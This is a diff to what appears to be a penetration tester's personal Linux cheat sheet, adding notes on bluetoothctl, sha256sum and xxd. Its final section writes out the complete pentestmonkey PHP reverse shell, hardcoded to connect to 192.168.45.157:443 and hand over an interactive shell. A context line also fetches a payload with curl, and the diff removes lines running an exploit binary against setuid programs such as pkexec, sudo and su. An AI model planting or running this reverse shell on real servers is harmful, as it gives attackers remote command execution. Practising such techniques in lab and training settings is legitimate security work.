@@ -34,6 +34,64 @@ cat << EOF > stream.txt
 
 ## Commands
 
+### bluetoothctl
+
+Enter into the bluwtooth terminal:
+
+```
+bluetoothctl 
+```
+
+Output: 
+
+```
+[NEW] Controller 5C:51:4F:DC:FB:D0 ChromeLinux_CBDE [default]
+[NEW] Device FB:59:51:BF:60:XX MX Anywhere 2
+```
+
+Get info about a device:
+
+```
+[bluetooth]# info FB:59:51:BF:60:XX
+```
+
+Output: 
+
+```
+Device FB:59:51:BF:60:XX
+    Name: MX Anywhere 2
+    Alias: MX Anywhere 2
+    Appearance: 0x03c2
+    Icon: input-mouse
+    Paired: yes
+    Trusted: yes
+    Blocked: no
+    Connected: no
+    LegacyPairing: no
+    UUID: Generic Access Profile    (00001800-0000-1000-8000-00805f9b34fb)
+    UUID: Generic Attribute Profile (00001801-0000-1000-8000-00805f9b34fb)
+    Modalias: usb:v046DpB013d0007
+```
+
+As you can see - my device was somehow not connected. And thus not responsive. What I did to make it work was only call 'connect':
+
+```
+[bluetooth]# connect FB:59:51:BF:60:XX
+```
+
+Output:
+
+```
+Attempting to connect to FB:59:51:BF:60:XX
+[CHG] Device FB:59:51:BF:60:XX Connected: yes
+Connection successful
+[CHG] Device FB:59:51:BF:60:XX UUIDs: 00001800-0000-1000-8000-00805f9b34fb
+[..snip..]
+[CHG] Device FB:59:51:BF:60:XX Paired: yes
+```
+
+
+
 ### df
 
 Displays the amount of space available on the file system containing each file name argument.
@@ -225,6 +283,20 @@ The "s" flag at the beginning stands for the substitute command. Then we specify
 cat /etc/passwd | grep -v "false\|nologin" | tr ":" " " | awk '{print $1, $NF}' | sed 's/bin/HTB/g'
 ```
 
+### sha256sum
+
+Calculate the hash of a file malware.txt containing the string "offsec":
+
+```bash
+sha256sum malware.txt
+```
+
+Output:
+
+```txt
+c361ec96c8f2ffd45e8a990c41cfba4e8a53a09e97c40598a0ba2383ff63510e  malware.txt
+```
+
 
 ### ss
 Sockets statistic. It can be used to check which ports are listening locally on a given machine.
@@ -274,45 +346,6 @@ uname -r
               print the hardware platform (non-portable)
        -o, --operating-system
 
-```
-
-
-### xrandr
-
-Xrandr is used to set the size, orientation and/or reflection of the outputs for a screen. It can also set the screen size.
-
-```
-# See commands and usage
-man xrandr
-
-# List current settings
-xrandr
-
-# Also, for listing current settings
-xrandr --current
-```
-
-Listing current settings helps you out to see the name of the outputs of your screens.
-
-In my case:
-
-```shell-session
-# Place laptop to the left of DP-2 (27'')
-xrandr --output eDP-1  --left-of DP-2
-
-# Place 34'' to the right of DP-2 (27'')
-xrandr --output HDMI-1 --right-of DP-2
-
-# Rotate 27''
-xrandr --output DP-2  --rotate left 
-
-# Mirror display
-xrandr --output DP-2 --same-as eDP-1
-```
-
-```
-xrandr --output  eDP-1 --brightness 0.5
-# ranges from 0 to 1
 ```
 
 
@@ -370,62 +403,61 @@ setvirtualenvproject
 
 
 
-### bluetoothctl
+### xrandr
 
-Enter into the bluwtooth terminal:
-
-```
-bluetoothctl 
-```
-
-Output: 
+Xrandr is used to set the size, orientation and/or reflection of the outputs for a screen. It can also set the screen size.
 
 ```
-[NEW] Controller 5C:51:4F:DC:FB:D0 ChromeLinux_CBDE [default]
-[NEW] Device FB:59:51:BF:60:XX MX Anywhere 2
+# See commands and usage
+man xrandr
+
+# List current settings
+xrandr
+
+# Also, for listing current settings
+xrandr --current
 ```
 
-Get info about a device:
+Listing current settings helps you out to see the name of the outputs of your screens.
 
-```
-[bluetooth]# info FB:59:51:BF:60:XX
-```
+In my case:
 
-Output: 
+```shell-session
+# Place laptop to the left of DP-2 (27'')
+xrandr --output eDP-1  --left-of DP-2
 
-```
-Device FB:59:51:BF:60:XX
-    Name: MX Anywhere 2
-    Alias: MX Anywhere 2
-    Appearance: 0x03c2
-    Icon: input-mouse
-    Paired: yes
-    Trusted: yes
-    Blocked: no
-    Connected: no
-    LegacyPairing: no
-    UUID: Generic Access Profile    (00001800-0000-1000-8000-00805f9b34fb)
-    UUID: Generic Attribute Profile (00001801-0000-1000-8000-00805f9b34fb)
-    Modalias: usb:v046DpB013d0007
+# Place 34'' to the right of DP-2 (27'')
+xrandr --output HDMI-1 --right-of DP-2
+
+# Rotate 27''
+xrandr --output DP-2  --rotate left 
+
+# Mirror display
+xrandr --output DP-2 --same-as eDP-1
 ```
 
-As you can see - my device was somehow not connected. And thus not responsive. What I did to make it work was only call 'connect':
-
 ```
-[bluetooth]# connect FB:59:51:BF:60:XX
+xrandr --output  eDP-1 --brightness 0.5
+# ranges from 0 to 1
+```
+
+
+### xxd
+
+As an example, we created a text file on our local Kali machine that contains the string "offsec". Let's dump its binary representation via the [_xxd_](https://linux.die.net/man/1/xxd) tool by passing the **-b** argument before the file name.
+
+```bash
+xxd -b malware.txt
 ```
 
 Output:
 
-```
-Attempting to connect to FB:59:51:BF:60:XX
-[CHG] Device FB:59:51:BF:60:XX Connected: yes
-Connection successful
-[CHG] Device FB:59:51:BF:60:XX UUIDs: 00001800-0000-1000-8000-00805f9b34fb
-[..snip..]
-[CHG] Device FB:59:51:BF:60:XX Paired: yes
+```txt
+00000000: 01101111 01100110 01100110 01110011 01100101 01100011  offsec
+00000006: 00001010 
 ```
 
+We displayed the content of the file through the xxd utility. The output shows the binary offset on the leftmost column, the actual binary representation in the middle column, and the ASCII translation on the rightmost one.
 
 
 ## chroot
@@ -563,23 +595,111 @@ Replace `https://github.com/example/repository.git` with the actual repo URL.
 curl http://10.10.14.38:800/payload -o payload
 
 
-./exploit2 /usr/bin/at
 
-./exploit2 /usr/lib/openssh/ssh-keysign
-./exploit2 /usr/lib/snapd/snap-confine
-./exploit-2 /usr/lib/policykit-1/polkit-agent-helper-1
-./exploit-2 /usr/lib/eject/dmcrypt-get-device
-./exploit-2 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-./exploit-2 /usr/sbin/mount.nfs
-./exploit-2 /usr/bin/pkexec
-./exploit-2 /usr/bin/passwd
-./exploit-2 /usr/bin/chsh
-./exploit-2 /usr/bin/fusermount
-./exploit-2 /usr/bin/sudo
-./exploit-2 /usr/bin/newgrp
-./exploit-2 /usr/bin/mount
-./exploit-2 /usr/bin/gpasswd
-./exploit-2 /usr/bin/umount
-./exploit-2 /usr/bin/su
-./exploit2 /usr/bin/at
-./exploit-2 /usr/bin/chfn
+
+## No EDITOR
+
+Create a file with a long content with no editor. In this case a PHP pentesmonkey reverse shell:
+
+
+```bash
+cat <<'EOF' > lala.php
+<?php
+// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '192.168.45.157';
+$port = 443;
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; sh -i';
+$daemon = 0;
+$debug = 0;
+
+if (function_exists('pcntl_fork')) {
+	$pid = pcntl_fork();
+	
+	if ($pid == -1) {
+		printit("ERROR: Can't fork");
+		exit(1);
+	}
+	
+	if ($pid) {
+		exit(0);  // Parent exits
+	}
+	if (posix_setsid() == -1) {
+		printit("Error: Can't setsid()");
+		exit(1);
+	}
+
+	$daemon = 1;
+} else {
+	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+}
+
+chdir("/");
+
+umask(0);
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+	printit("$errstr ($errno)");
+	exit(1);
+}
+
+$descriptorspec = array(
+   0 => array("pipe", "r"),
+   1 => array("pipe", "w"),
+   2 => array("pipe", "w")
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+	printit("ERROR: Can't spawn shell");
+	exit(1);
+}
+
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit("Successfully opened reverse shell to $ip:$port");
+
+while (1) {
+	if (feof($sock)) break;
+	if (feof($pipes[1])) break;
+
+	$read_a = array($sock, $pipes[1], $pipes[2]);
+	stream_select($read_a, $write_a, $error_a, null);
+
+	if (in_array($sock, $read_a)) {
+		fwrite($pipes[0], fread($sock, $chunk_size));
+	}
+
+	if (in_array($pipes[1], $read_a)) {
+		fwrite($sock, fread($pipes[1], $chunk_size));
+	}
+
+	if (in_array($pipes[2], $read_a)) {
+		fwrite($sock, fread($pipes[2], $chunk_size));
+	}
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+function printit ($string) {
+	print "$string\n";
+}
+?>
+EOF
+```
